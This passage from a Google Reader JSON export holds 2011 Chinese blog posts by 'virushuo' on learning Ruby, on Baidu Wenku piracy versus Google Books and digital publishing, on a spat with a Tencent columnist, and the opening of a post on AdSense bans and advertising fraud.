社区。ruby社区的活力，友好，规整，统一的审美，给我留下了非常深刻的印象。DHH和37s对这个社区影响巨大，我也相信他们的理念，小公司未必不好，小公司未必不伟大，追求pv不如追求极致的产品。我们创造一个产品，是为了解决一类人的问题，并不是为了超越谁或和谁竞争。</p>\n\n<p>15年前，PHP 3.0之前的版本完全不可用（当然，那时候PHP的简称还叫做Personal Home Page），那时候用c写cgi/isapi或者用perl是网站最常见的开发形式。那时候说PHP是下一代语言，很多程序员都会不同意，他们会挑出来PHP一万个不如c或者不如perl的地方。这些都没错，但世界是会变化的。PHP今天确实成了一种应用广泛，老幼皆宜的语言。我并不认为未来ruby会取代PHP，但至少，我认为下一代高质量的互联网产品出现在ruby社区的机会更大，这就像当年PHP vs perl一样，乃大势所趋。</p>\n\n<p>最后我说一句可能不太好听的话，如果你没有下决心转型成为一个写信教主那样的专门忽悠的人，如果你还觉得技术有点意思，还想自己创造点产品，那么应该保持足够的技术敏感力，认真的学习一些新东西，而不是给自己寻找各种借口。就像<a href=\"http://blog.xiqiao.info/2010/12/02/858\">这张漫画</a>一样。要多问问自己，是这东西真的不好，还是自己学不进去了？当然，承认后者是很难的。一年前我也确实没学进去。</p>\n\n<p>我学ruby的过程中，很多朋友提供过不少帮助，没有他们的回答和blog，估计会学的更难。在此一并感谢： @rainux @robinlu @moming2k @Anxonli @soulhacker<br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370754173",
    "timestampUsec" : "1313370754173596",
    "id" : "tag:google.com,2005:reader/item/a5d0558b6c7711dc",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "写给和百度作战的文艺工作者们",
    "published" : 1301114594,
    "updated" : 1301142077,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/03/26/post_78.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>我是一个靠写代码生活的人，我觉得我们这个行业，和创造文艺产品的人--比如写书的作家--是非常一致的，盗版问题同样影响着我们，只不过我们用的是和作家不一样的语言来创造产品。比作家们幸运的是，我们可以完全脱离中国市场，去做英文的德文的日文的法文的软件，而且特别不要做中文的软件，这样才能让自己的作品在一个正常市场内销售并获得应有的收益。我们认为中国的问题无解，于是我们放弃了。我们不再愿意创造中国人普遍可用的工具，因为赚不到钱。作家们比我们悲哀一些，因为文化和语言是有民族性的，你们不能把中文的作品卖给其他国家的人，也很难快速学会用其他文字写作。于是，你们只能死磕。</p>\n\n<p>在前面的这些年，大家始终没意识到这个问题的严重性，也从来没有什么行动，虽然你们可能早就从百度mp3下载音乐，下载盗版软件，损害着其他领域的创造者们。今天你们也面临着一样困境。现在痛苦终于降临到了你们身上。</p>\n\n<p>或许你们还记得，不到一年之前，google books索引你们的书，仅仅是索引（用户只能在搜索的时候展现片段内容做为提示），而不是让用户阅读，google就愿意付给你们60美元。但你们嘲讽的拒绝了，你们认为那是作恶。比如王晓峰这篇 <a href=\"http://www.wangxiaofeng.net/?p=4055\">《股沟挖了一条沟》</a> 当时我就明白，过不了多久，你们会 后悔的，但是确实没想到来的这么快。事实上google books确实没有作恶，他们做的事情和书商摘取你们作品的片段放在广告宣传页上一样，让读者搜索感兴趣的内容的时候，知道你的书中有提及，如果要阅读，需要付费。</p>\n\n<p>数字化大潮势不可挡，这本来是全球搜索巨人释放的极大的善意，这大概也是数字阅读解决方案中，技术和商业结合最好的方式。可惜王晓峰这种自傲的文人认为是作恶。他那篇讽刺google的文字到现在还能搜索到很多，我承认王晓峰影响力不小，但他错了。大部分作家或许都是这样，他们活在自己理解的世界中，不愿意学习新东西，甚至连多想一些都不愿意。在他们的世界里，就是出版卖书赚钱，从来没想到世界变化如此之快。在上一次对google的攻击中，只有韩寒认真的了解了google到底干了什么，并公开发文支持。对这个事情有兴趣的可以读韩寒这篇blog:<a href=\"http://blog.sina.com.cn/s/blog_4701280b0100fzmm.html\">http://blog.sina.com.cn/s/blog_4701280b0100fzmm.html</a></p>\n\n<p>而今天你们看到了百度文库可以不花钱看你们的文字，于是你们集体愤怒了。我今天要告诉你的是，这还不算什么，对你们更有杀伤力的，是百度和爱国者一起做的叫做\"百看\"的电子书。新闻见此： <a href=\"http://tech.sina.com.cn/digi/mp4/2011-02-23/19475209593.shtml\">http://tech.sina.com.cn/digi/mp4/2011-02-23/19475209593.shtml </a>这是爱国者出的电子书阅读器，它的特点是可以直接连接到百度文库。今天你们知道了百度文库是什么，那你们终于可以想象当人手一本这样的电子书的时候，会发生什么。就是人们只要买这么一个设备，就可以想看什么就看什么，而且阅读体验和纸书差不多，可以随身带着，比纸书方便多了。这个计划如果成功，那就是你们这个行业的灭顶之灾。百看我一不小心就会打成白看，这名字起的真好啊。</p>\n\n<p>呵，对于百度和爱国者，他们管这个叫做\"希望能将更海量的知识、文档和消费者分享\"，对于你们，意思是人们再也不用花钱买你们的书了，到时候恐怕不仅作家会死，出版公司也会死，大出版社或许不会死，但他们也只能靠印教材活着了，印厂的日子也不会太好过。要说什么破坏了社会稳定，这东西才是，他会瞬间摧毁几个行业，摧毁文化的基础。盗版从来都不是最可怕的事情，最可怕的事情是成建制的盗版，百看和百度文库都是成建制的盗版。所谓成建制的盗版，意思是说盗版者不需要付出任何东西，甚至不需要知识和技巧，直接就可以\"享受\"盗版，这种盗版用起来比正版还舒服（正版无论如何都要有个购买过程，总是多了一步）。这时候，谁会傻瓜的麻烦去付钱呢？在和成建制盗版对抗的过程中，我们软件作者们想出了最多的花样，各种加密，各种功能限制都被用来保护软件，软件作者以牺牲产品体验为代价进行加密，甚至曾经不惜破坏盗版者的电脑。最终的结果，是我们失败了，至少在中国失败了，到今天还有专门盗版iPhone软件的网龙活的很好，并以此做为盈利模式。幸好在美国，通过法律，大家都成功了。对于搜索引擎所谓的\"避风港原则\"，美国也有\"数字千年法案\"应对。（google的数字千年法案看这里 <a href=\"http://www.google.com/intl/zh-CN/dmca.html\">http://www.google.com/intl/zh-CN/dmca.html</a> ）。按照这个历史看，如果不改变方法，对文字作品的斗争，在中国一样会失败。</p>\n\n<p>这次所有作家写出来关于这件事的文字，看着都是那么的无力。请问你们面对抢劫者的时候，哭穷，叫惨，这些都有用吗？没用的。你们需要战斗，而且要用自己擅长的方式来战斗，把对方拖入你们擅长的战场中，并击败他。对于作家，我觉得最好的办法就是用文化摧毁对方的品牌。做法很简单，不用正面去攻击骂对方，你们只需在自己创造的文化作品中，让作品中的角色说话。比如很酷的主人公会对别人说\"用百度真丢人\"，漂亮的女主角拒绝追求者的时候会说\"你还用百度，这么土，我才不跟你交往\"。我这只当扔块砖，具体的技巧你们擅长，就像前面提到王晓峰那篇愚蠢的blog，影响了很多人，他们会拿着这个来说\"你看，google也作恶嘛\"。作家本身就是媒体和文化的创造者，你们有能力不依靠别人，仅靠自己在文化和品牌上摧毁对方。。特别需要注意的是，\"把作品中反面角色的名字起成李彦宏\"的办法并不好，因为你们要对付的是百度这个品牌，并不是其创始人。换言之，李彦宏卸任百度CEO，盗版的状况大概也不会变好。</p>\n\n<p>前面很多年，google被欺负你们不说话，甚至你们还参与欺负google。现在，你们知道了google的好。虽然我觉得你们活该，但现在还不算太晚，来战一场吧！这战斗不会一帆风顺，因为对方有钱，你们很有可能会被要求删除相关内容，很有可能百度在你所谓的媒体投放了巨额广告，你的领导要保护他。但这其实都不算什么，百度虽然势力庞大，但也比不上***强大，你们不也在作品中变着方的挖苦他们吗？这就是所谓\"你们擅长的战场\"。</p>\n\n<p>你们大概会质疑这种办法的效果。这确实是一个长期的缓慢的过程，但确实有杀伤力，文化的威力，你们最清楚。只不过，你们得丢掉心理的幻想，不要觉得对方是可以谈价钱的。你见过拉磨的驴子和主家谈价成功过吗？对于百度，你们就是那驴子。这是你死我活的战争，甚至不是你们自己的战争，是文化行业的战争。请你们不要拒绝新媒体，传统出版一定会消亡，而且消亡速度在逐渐加速，要学会正确的使用新媒体。或许当你们这么干了，百度会付出公关费来摆平你们，他们现在每年也支付着大量的公关费对付各种负面，但这些钱不会给你们这些创造内容的人。甚至将来百度变成唯一渠道的时候，你惹急了了他们，他们会干脆在搜索结果中封杀掉你。如果大家都用百度，你这个人在互联网的世界就像不存在一样了，不要以为荒唐，这就是现在网站站长们碰上的问题。所以现在动手还不算太晚。除此之外，你还能做的了什么？</p>\n\n<p>至于不用百度还能用什么，我的妈妈65岁，用google几乎所有的产品。其他，你们自己看着办。</p>\n\n<p>Google退出中国的时候，你们一声不吭，之后的两个月，你们对google books口诛笔伐。今天，如果你决定不做什么，不写什么，至少也应该把我这文章让更多人看到吧。</p>\n\n<p>注1：王晓峰并非错字\"王小峰（真名王晓峰，笔名王小峰，网名带三个表）\" 来自<a href=\"http://www.hudong.com/wiki/%E7%8E%8B%E5%B0%8F%E5%B3%B0\">互动百科</a></p>\n\n<p>注2：去年我写过一篇关于百度和google的blog，如果你看完本文有兴趣知道更多，请看这里  <a href=\"http://blog.devep.net/virushuo/2010/01/14/blog56google_blogtinyfool_1_go.html\">http://blog.devep.net/virushuo/2010/01/14/blog56google_blogtinyfool_1_go.html</a></p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370753687",
    "timestampUsec" : "1313370753687166",
    "id" : "tag:google.com,2005:reader/item/43192cce1833f480",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "草民跪拜程皇",
    "published" : 1301375737,
    "updated" : 1301377851,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/03/29/post_79.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p></p>\n\n<p> <a href=\"http://blog.devep.net/virushuo/2011/03/26/post_78.html\">前天写了个blog</a>，被转载不少。转天见FT中文网刊发腾讯科技频道总监程苓峰文章一篇《 <a href=\"http://www.ftchinese.com/comments/index/001037750\">韩寒是1微博是0</a>》</p>\n\n<p>此文观点对错暂且不说，其中【随同韩寒博客火起来的。还有两篇草民写的博客，被很多V用户称为\"比韩寒更精彩，更狠辣\"。】一句看的颇为疑惑。从下文描述，这两位草民的文章至少有一篇是我那篇。</p>\n\n<p>草民这词已经多年不见。自从封建帝王时代结束，自民国以来，中国只有公民，再无草民这一说。实在令人不解这说法是怎么冒出来的，难道是程总监文化程度不高，把公民二字误写成草民？想来也不对，既然能在一个市值第一的互联网公司做总监，还给媒体写稿，文化程度不高是说不过去的。FT中文网之前也算靠谱的媒体，编辑也不应该连错字都看不出来。这猜想应该不靠谱。</p>\n\n<p>再看原意，草民这词就算使用，基本也用于自嘲，但用在他人身上，那就是嘲讽。就像程总监可以自称\"家慈的犬子\"（王仲夏创造的这个说法），但我要冲着他说一句犬子程苓峰，估计他也得跳起来。如果是拿草民二字替我自嘲，那就是说程总监缺点起码的文化修养，好歹也算个文化人，这猜想恐怕也说不过去。</p>\n\n<p>原句说到\"被很多V用户称为\"，莫非这V用户是草民的对称说法，加V就不是草民，不加就是？想这草民一说，是皇权时代没官职的人自称的，如果在新浪微博加V被程总监当做一种官职，那么新浪就被他当作了皇权，对于到现在的概念，新浪微博就是政府。这说法置党和国家于何处？莫非因为腾讯微博竞争不过新浪，就派了他们的总监一名暗中怂恿众人以新浪当政府，好早日给新浪扣一个煽动颠覆国家政权的罪名？这猜想太阴谋论也太宏大，看的我自己都心惊肉跳，不妥，也放弃了吧。</p>\n\n<p>好吧，这词是想不明白了，还是看看这文章吧。</p>\n\n<p>按照互联网的规矩，如提及别人观点，尽量加引用链接，这样读者可以顺着线索扩展阅读。这种扩展带来了更多的知识量和交互，也是知识共享的基础。程先生此文提及别人观点不少，链接反而一个没有，这也是难能可贵的。一般来说，如果不加链接，也尽量应该指出原文是谁写的，以供读者查询。志向远大点的作者，您就算不为了读者方便，假使您的文章能流芳百世，将来人们考古找起来线索也方便，也算好事。做为一个互联网公司工作的人，如果不按照互联网的规则办事，这文章写的就不算合格。</p>\n\n<p>写到这里，我突然明白了什么，翻看程苓峰老文，此人时常辟谷，对不起，我看到这两个字和科技中心总监的头衔放在一起，\"顿时就凌乱了\"。这样说来也就大约可以理解了，大概是程先生辟谷太多，营养不良，精神恍惚，穿越回了某个朝代，自己成了皇族，看我们这些blogger自然就是草民了，除了跪拜一下程家皇帝，我也没什么别的办法了。</p>\n\n<p>调侃归调侃，正经说说我的希望：</p>\n\n<p>1 在互联网上写文章，要按照互联网的规则来，该引用引用，该链接链接，方便读者，尊重原作者。<br>\n2 摆平心态，人没有三六九等，既然来交流，就平等交流。<br>\n3 不要过度放大微博的作用，这只是交流方式的一种。</p>\n\n<p>最后，同为FT中文网撰稿人，我认为FT的质量日益下降，至少几年前我所熟悉的FT，不会刊发这种质量的文章。考虑到FT中文网北京办公室正在搬家，大概是工作环境变化，有点浮躁，可以理解。希望FT保持固有质量，不要因为营业额，团队的扩大而降低品质。</p>\n\n<p><br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370752317",
    "timestampUsec" : "1313370752317077",
    "id" : "tag:google.com,2005:reader/item/7319cb45200dd1a2",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "数字化版权，接受或反抗",
    "published" : 1301630693,
    "updated" : 1301648844,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/04/01/post_80.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>注:这篇文章是为南方周末而写，发表在2011年3月30日南方周末，分别为：<a href=\"http://www.infzm.com/content/57050\">数字化版权：反抗什么，接受什么</a>和<a href=\"http://www.infzm.com/content/57101\">\"Google Books侵权\"到底怎么回事</a>两篇，内容略有补充和修改。我在这里贴的是原始版本，更原生态一点。</p>\n\n<p>----------------------------------------------------------</p>\n\n<p>去年，我决定从北京搬家到上海。临行之前把在北京八年积攒的书半卖半送给了朋友，暗自发誓再不买纸书。无奈的是除了从amazon买英文书，几乎没有什么靠谱的办法可以正常的买到我想看的中文图书。于是一年之后，家里又重新堆满了纸书。我甚至和一些认识的作者商量，能不能我转帐给你一本纸书的钱，你给我一个电子版，我保证不泄漏出去。答案也都是否定，或者是出版社不允许，或者是这样操作太麻烦。总之，一年的时间，我没能用电子化的方式买到哪怕一本中文图书。需要被电子化和数字化的东西，不止有文字，还有音乐，视频和软件，其中软件比较特殊，天生就是数字化的产物，除此之外它们所面临的情况都是差不多的。</p>\n\n<p>在这几天，和这个话题相关的有两件事值得重视。一件是Google在美国的图书和解协议被驳回，另外一件是百度文库中充斥着盗版终于让中国的作家们愤怒了。</p>\n\n<p>这两件几乎同时发生在两个国家的事情，看上去有些相似，其实本质大有不同。甚至可以说他们分别代表了数字化出版的两极。把这两家放在一条坐标轴的正负两边，中间还可以依次摆上amazon和apple这两个巨头，在他们之间再星罗棋布分布着各种小网站和创业公司。这样，整个数字化出版的生态，就齐全了。</p>\n\n<p>Google激进，Amazon和Apple保守，他们在尝试未来可行的道路。而百度的做法，是为了自己的利益侵害别人。</p>\n\n<p>百度文库不是一套简单的\"盗版文章下载系统\"，而是一个复杂的积分系统。要在百度文库下载，需要有积分，而最快的积分获得方式，是上传文档，并设置积分，这样上传者在别人下载的时候可以分到积分，这些积分又可以用来下载其他文档。这样说起来很绕，概括一下就是：如果你要下载，就必须先上传。如果大家都上传自己创作的文档（或者自己拥有版权的文档）那确实是一件好事，可是哪有这么多人有创作能力呢？于是只能去\"借用\"别人的文档上传了换积分。这样一来整个模式就变成了传说中的盗窃集团和黑帮的模式，\"入我门者，先去偷\"，\"入我帮派者，先杀人\"。百度文库用这种模式鼓励了普通用户成为盗版者，为百度提供无版权内容，百度自己则试图以\"避风港原则\"解释自己只是平台，盗版的不是自己，是用户。</p>\n\n<p>百度文库的这种模式是很恶劣的。无论Google，Amazon或是Apple，甚至无数小的创业公司，如果想要涉足数字出版，首要任务都是保护好版权人的利益，一方面维护法律上的公平，另一方面也要通过技术帮助行业正常发展，让创作者得到合理的收益，保持一个正常的生态。百度则完全把创作者踢开，只想自己如何快速积累内容流量并盈利，至于行业如何，创作者如何，他们不在乎，甚至法律如何他们也不在乎。这样的事情百度操作起来游刃有余，在文字之前，他们在MP3上也干过同样的事情。</p>\n\n<p>百度和爱国者电子书合作电子书品牌百看，把这种基于盗版的商业模式又推进了一步。在美国的情况是Amazon和大批出版商签订了书籍电子版的版权，确定了双方满意的分成模式之后销售电子版，为了让读者体验更好，购买更方便，又开发了电子书设备Kindle。国内电子书市场争夺也非常激烈，拥有足够多可供阅读的内容，对于电子书的销售和品牌有决定作用。爱国者基本没有自有版权，又想做电子书，他们干脆和百度文库合作，把百度文库当作内容源。在合作方式和用户体验上，他们复制了Amazon Kindle的模式，唯一的区别是不提版权，完全基于盗版完成。市场已经证明了Kindle是受欢迎的，可想而知，一个基于盗版的产业链会带来什么样的危害。根据去年年底Amazon公布的数字看来，他们销售的十大畅销书电子版销量已经超过了实体书，电子版销售只进行了3年，这个产业的变化速度越来越快。同样的情况如果放在中国，因为百度文库并不需要付钱，就意味着出版商和创作者能赚到的钱减少的速度会越来越快。按照这个速度发展下去，民营出版商会受到巨大冲击，甚至大批倒闭。创作者本来就不多的版税收入也会锐减，这对文化出版行业是毁灭性的打击。</p>\n\n<p>这并非危言耸听，这样的行业毁灭在通用软件市场已经发生过一次。美国的情况不同于中国，他们有完善的版权保护法律，执法严格，百度文库这种模式在美国根本无法出现，盗版软件下载站也不能生存。所以他们到今天仍然有通用软件市场，也有单机游戏市场。在中国，几年前通用软件，个人软件，单机游戏这三个市场已经被完全毁灭。中国最大的通用软件公司金山软件变成了一家靠网络游戏赚钱的公司，金山词霸在日本销售情况很好，在中国不赚钱，可以说金山在用日本的软件销售收入补贴中国的软件市场。当一个市场正常的盈利方式被消灭，剩下的就都是不正常的。所以我们有全世界最多的流氓软件，木马病毒，还形成了灰色产业链。我们不再有早年那些制作精致剧情引人的单机游戏，我们只有粗糙的网游。甚至网游都被私服影响，没法正常的靠卖点卡盈利，只能靠卖游戏中的虚拟装备赚钱，由此又引发了盗号木马等一系列新的问题。我们的网站没法靠收会员费赚钱，只能有铺天盖地强制弹出的广告。在被无知识产权保护而摧毁的软件，游戏行业，因为其模式复杂，尚可以靠转型和增值服务生存。可是作家们怎么办？靠在文章里面做品牌植入，靠免费写书当名人去做广告代言？</p>\n\n<p>Amazon的经验证明了数字出版是肯定会到来的，因此无论是出版行业还是创作者，都应该学会接受新媒体，而不是简单拒绝。电子书比传统纸书有太多优势，环保，成本低，无需物流配送，检索容易。今天在文字上的情况，多年前在音乐市场也发生过，起初人们认为MP3音质不如CD，现在仍然有很多爱好者坚持使用CD，但更多的人已经接受并愿意购买MP3，数字化之后的新市场比传统唱片市场大的多。</p>\n\n<p>唱片行业也曾经和数字化进行过殊死搏斗。在美国不会有百度文库和百度mp3这样的产品出现，当时唱片行业最大的敌人是P2P技术，P2P是一种没有中心网络的点对点传输技术，网络上没有存储内容的中心节点，所有内容都分布在不同用户的个人计算机上。使用P2P技术，没有一家明确的公司会对侵权行为负责，因为每个用户上传的只是一个文件的某一部分，所以也很难追求上传者的责任。唱片公司只好用了一些策略，他们雇人往P2P网络中上传假内容，文件名起成音乐的名字，但实际内容是噪音或者其他无用的文件，这种假文件大量的混入P2P网络，让用户下载体验变的很差，用户下载到的东西往往是不能用的，还有一些crack利用这个机会上传病毒。这段经历好像是在给Apple的iTunes商店模式铺路，用户越来越希望得到一个安全可靠的下载数字音乐方式，就算付钱也没问题。唱片商也终于能够接受了数字化的方式，最终几方一起促成了iTunes商店的成功，重铸了Apple的辉煌，也挽救了正在衰落的唱片业。</p>\n\n<p>在所有数字化媒体公司中，Amazon和Apple相对保守，他们的游戏规则更像人们日常所熟悉的。他们和出版商签约，获得书籍电子版的代理权，通过自己的渠道和技术平台出售。Amazon从传统书籍在线零售基础上增加电子版出售业务，而Apple几年前在数字音乐的发行上也积累了丰富的经验。总体来说，除了和出版商（唱片商）在定价权上的争夺，这种模式没有太多问题。</p>\n\n<p>相对于他们，Google正在推广的模式是激动人心的。以往人们找到一本好书，要么试读，要么看书评，要么等朋友推荐。从本质上说，都是先体验书的某个片段，之后做出购买决定。问题是，这个可供体验的片段是固定的，要么由出版商选出来，要么由书评人选出来，或者是朋友选出来。这些选择未必适合你的口味，可以想象，世界上还有很多书，是我愿意读的，但是我无法找到说服我去花时间读完全书的那个片段，别人也没办法替我找到。Google books要做的正是解决这个问题。Google会在用户搜索的时候，根据用户的搜索，在巨大的书库中寻找匹配的内容，把找到的片段展现给用户，如果用户觉得这就是他需要的，那么可以付钱购买这本书的电子版。这样的好处是展现的片段并不固定，根据搜索条件不同而变化。这样用户更容易找到他们值得阅读的书--正如Google之前在网页搜索上所做的，通过编制索引和公正的排序，让用户找到值得去访问的网站，并给网站带去流量。Google books是帮助用户找到适合的书，并给书带去流量，最终转换成销量。</p>\n\n<p>因为不是固定的推荐某一片段，而是根据用户搜索条件选取，所以Google必须拥有书的全部内容，这就是所谓\"Google扫描全书\"说法的来源。这里尤其需要注意的是，Google虽然拥有了全书内容，但并不会直接展现给用户，那样是侵犯版权的，Google永远只会展示符合用户搜索部分的上下文片段，这并不侵犯版权。何况按照Google提出的和解协议，仅是扫描和索引这些内容，就愿意付给作者60美金。这是前所未有的模式，也是技术和版权结合最好的方式。顺着这个思路，我们可以想象未来更多可能。比如说，我搜索到了有兴趣的内容，但是觉得为这一点内容买一本600页的书没必要，也太贵，版权持有者能不能允许我只买我需要的这10页？再比如说，能不能和互联网的模式一样，通过展示和书内容相关的广告付给版权持有者收入，而对读者免费？可以想到的可能性有很多，一旦这个模式运行起来，就会开启巨大的长尾市场，给出版商和作者带来原来不可能有的收入。这些，都是过去传统图书不可能做到的事。</p>\n\n<p>用户也可以通过Google books的ebookstore购买全书，或者按照Google展示的链接到Amazon等在线书店购买。美国版权保护严格，出版商地位仍然非常强势，在定价权上Google并不占优势，目前ebookstore的定价是按照书籍上标记的实际定价确定的，而在Amazon购买实体书往往有折扣，所以比较起来从Google购买电子书的价格并不比实体书便宜。对于作者来说，在这种模式下得到的版税仍然是通过出版商获得的，出版商和Google的协议分成比例并不相同，比较多的出版商可以获得70%分成，不同的出版商通过协商有可能得到不同的分成比例。</p>\n\n<p>这是一个伟大的构想，考虑到人类几十年前甚至更久以前创造的书籍和资料，在今天由于缺乏引导，已经几乎无法被普通人接触到，Google Books事实上是在挽救人类的历史和智慧。但这样的计划，为什么会遭到诉讼，并且和解协议最近还被判为无效呢？导致诉讼的原因有几个，包括：<br>\n<ol><br>\n\t<li>孤版书和绝版书的版权获得方式问题，一些书已经不再出版了，Google可以从图书馆找到这些书并扫描索引，但是这些书的版权和版权人如何界定。</li><br>\n\t<li>图书馆是花纳税人钱的公益组织，等于他们用纳税人的钱买来的书，现在去和Google这样的商业企业合作，这在法律上会导致一些问题。而且如果Google Books形成垄断，最终导致一些图书馆关闭，如果恰好这些倒闭的图书馆中有绝版书，其他地方看不到了，就等于是把纳税人的共同财产转移到了商业企业中。这些问题在美国都是无法被容忍的。</li><br>\n\t<li>如果所有的书都被Google Books收录了，Google可以决定如何展示和设置阅读权限，这就造成了垄断，导致公民获得知识的权利受到限制。在美国，这种情况会被认为不公平，也是无法容忍的。</li><br>\n\t<li>除此之外还有一系列关于钱的问题，比如出版商和Google谁拥有定价权，图书馆使用Google Books要不要付钱等等。这些都是操作上的细节问题，并不重要。</li><br>\n</ol></p>\n\n<p>根据这些问题，Google在09年提出过一份和解协议，并提交法院希望获得许可，这份协议基本上得到了出版商和图书馆的认可。但是其他企业又表达了不满，比如Amazon,Yahoo,微软等等在或者未来有可能在数字出版市场上盈利的公司甚至组织了一个联盟对法院施压。最近这次法官驳回和解协议，其争议主要集中在对于孤立版权作品的opt-out和opt-in，也就是说，到底是默认进入，版权人不满意可以撤出，还是根本不能进入，直到获得版权人许可。这部分书主要集中在不容易获得版权或版权人无法联系等情况，如果一一签订合同会浪费大量人工，导致这个项目难以进行。但如果采用默认进入的方式，又显得不公平，对版权人有可能不利，或者会造成垄断。</p>\n\n<p>仔细了解之后我们可以很清楚的看到，对于美国出版商，版权人和司法部门，在方向上都是可以接受Google的做法，只是为了保护宪法所赋予的公民权利，预防可能发生的垄断，需要在细节条款上做若干约定和限制。这绝不是之前中国作家们所理解的\"Google侵权\"或者\"Google作恶\" 。或者说，就算Google的做法有错，这个错误主要是对美国纳税人\"不够公平\"，\"可能形成垄断\"，\"可能妨碍公民获取知识\"，这也算不得作恶。</p>\n\n<p>虽然和解协议还需要调整，但和Google明确签订了版权的出版商提供的电子版本已经可以在Google Books的ebookstore购买了，当然，现在还只有美国的IP和信用卡帐号才能支付。目前的价格并没有什么优势，一些电子书甚至比实体书还要贵，这大概是平衡了各方利益之后的结果。</p>\n\n<p>在中国，数字版权的问题更加复杂一些，出版社对数字版权的态度很不一致，有一些在尝试，一些绝不接受，还有一些虽然在尝试，但希望自己搭建数字化平台，不愿意和其他厂商合作。这些态度导致了实际操作更加困难。虽然百度的做法是这个公司一贯行为的延伸，需要被制止。但解决数字化出版的问题，并不是打压下百度就可以彻底解决的，最终方案还需要出版社，作者和商业公司一起努力，寻找各方都能够接受的解决方案。</p>\n\n<p>无论基于以上何种模式，读者，作者还是出版商，都应该看好数字出版的未来，对于所有行业，数字化都是大趋势，如果转型得当，就能完成产业升级，整个产业中所有角色都可以获得更多的好处。但是在讨论具体的执行细节之前，必须先制止百度文库这种侵略性的发展，制止基于盗版的商业模式和产业链的形成，不然未来面对的不是内容枯竭，就是一个如同今天软件行业充满流氓软件一样的灰色市场。<br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370751857",
    "timestampUsec" : "1313370751857549",
    "id" : "tag:google.com,2005:reader/item/24ca85baaf90e97d",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "Google AdSense以及blog的选择",
    "published" : 1305772606,
    "updated" : 1305775225,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/05/19/google_adsenseblog.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>最近一些中文blog的Google AdSense帐号被封，引起了很多争论。这个问题并不像看上去的那么简单，没法简单的说出谁对谁错，从规则上说，我认为Google确实缺少被封之后有效的救济手段，但从实际来说，这又存在很多困难。要理解这些问题的产生，就需要弄清楚AdSense的整个模式是怎么来的。于是，我们得从广告开始说。</p>\n\n<h2>一 广告，效果，作弊</h2>\n\n<p>抛开广告的形式，把广告抽象为广告这个词，那么广告本身没什么复杂的，无非就是甲方利用乙方进行宣传的活动。但事情一旦涉及到了钱，就会变得复杂。涉及到了钱，甲方（广告主）就希望少付钱，多办事，乙方（发布商或者叫做媒体）就希望多赚钱，少出资源。这本身就是矛盾的，于是双方就要议价，讨价还价，这样就有了广告报价，什么位置多少钱，买多长时间多少钱，打包几个方案多少钱，诸如此类。有了价格和交易，就一定要存在中间环节，这样就有了广告代理，媒介之类的角色存在。这些中间商的存在目的自然都是为了获取利润。</p>\n\n<p>有了中间商之后，这个游戏就更复杂了。除了普通甲乙双方做生意的\"店大欺客，客大欺店\"的讨价还价法之外，中间商会做更多的事情，比如如何排期，如何排位置，给什么样的客户什么样的价格，这样本来很简单的广告终于变成了一般人搞不明白的东西----搞不明白过程，也搞不明白价钱。</p>\n\n<p>对于广告主，刚才说过，他们是希望少花钱，多办事的，他们有足够的动力想出很多办法来衡量广告效果。过去在传统媒体上，他们会在不同的广告上使用不同的电话号码，看哪个号码打的人多，在互联网时代他们监测流量和广告的点击量，更聪明一点的广告主会给广告加上代码来跟踪进入用户最终的行为。对于中间商和发布商来说，日子越来越难过，他们必须保证广告有\"效果\"，才能赚到更多的钱。</p>\n\n<p>于是就有了作弊。以上说的所有角色都有充分的动机作弊。发布商不用说，他们希望得到更多的广告费，中间商自然也一样。甚至广告主这边具体的执行人，有时也会为了工作业绩或者和发布商的连带关系而作弊。</p>\n\n<p>作弊问题伴随着广告的存在而存在，随着广告形式的改变而改变。传统媒体会虚报印数，门户网站会虚报流量，放点击广告的会用程序或人工去多点几下广告，按照效果付费的广告作弊的方式更令人叫绝，人们真的会去做和正常用户一样的行为----感谢中国便宜的人力成本。我有一个做网络游戏的朋友，她会认真的检查广告带来的用户是不是真实，她总能发现好玩的事情，比如，所有人物都在某个时间段迅速达到某个级别之后再也不登录了，也发现过新注册的用户很多密码是一样的...其实这也没什么可惊讶的，只不过是作弊方不太认真而已。</p>\n\n<p>跟这个行业打过点交道的人，应该都熟悉扣量这个词。这个词的意思是参与广告的几方因为各种原因，对报表中体现的数字表示怀疑，于是大家一